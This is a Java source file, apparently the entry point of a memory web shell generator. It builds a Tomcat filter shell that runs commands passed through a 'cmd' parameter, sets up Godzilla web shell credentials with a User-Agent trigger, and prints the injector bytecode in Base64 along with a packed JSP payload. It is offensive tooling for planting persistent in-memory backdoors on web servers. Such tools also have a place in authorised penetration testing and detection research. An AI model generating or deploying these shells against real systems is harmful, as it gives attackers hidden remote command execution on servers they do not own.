package com.reajason.javaweb;

import com.reajason.javaweb.config.*;
import com.reajason.javaweb.memsell.AbstractShell;
import com.reajason.javaweb.memsell.packer.Packer;
import lombok.SneakyThrows;
import net.bytebuddy.jar.asm.Opcodes;
import org.apache.commons.codec.binary.Base64;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class GeneratorMain {

    public static void main(String[] args) throws IOException {
        ShellConfig shellConfig = ShellConfig.builder()
                .server(Server.Tomcat)
                .shellTool(ShellTool.Command)
                .shellType(Constants.FILTER)
                .targetJreVersion(Opcodes.V1_6)
                .build();
        GodzillaConfig godzillaConfig = GodzillaConfig.builder()
                .pass("pass")
                .key("key")
                .headerName("User-Agent")
                .headerValue("test123").build();
        CommandConfig commandConfig = CommandConfig.builder().paramName("cmd").build();
        InjectorConfig injectorConfig = new InjectorConfig();
        GenerateResult generateResult = generate(shellConfig, injectorConfig, commandConfig);
        if (generateResult != null) {
//            Files.write(Paths.get(generateResult.getInjectorClassName() + ".class"), generateResult.getInjectorBytes(), StandardOpenOption.CREATE_NEW);
//            Files.write(Paths.get(generateResult.getShellClassName() + ".class"), generateResult.getShellBytes(), StandardOpenOption.CREATE_NEW);
            System.out.println(Base64.encodeBase64String(generateResult.getInjectorBytes()));
            System.out.println(new String(Packer.INSTANCE.JSP.getPacker().pack(generateResult)));
        }
    }

    public static GenerateResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        Server server = shellConfig.getServer();
        AbstractShell shell = server.getShell();
        if (shell == null) {
            throw new IllegalArgumentException("Unsupported server");
        }
        return shell.generate(shellConfig, injectorConfig, shellToolConfig);
    }

    @SneakyThrows
    public static byte[] generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig, Packer.INSTANCE packerInstance) {
        GenerateResult generateResult = generate(shellConfig, injectorConfig, shellToolConfig);
        if (generateResult != null) {
            return packerInstance.getPacker().pack(generateResult);
        }
        return null;
    }
}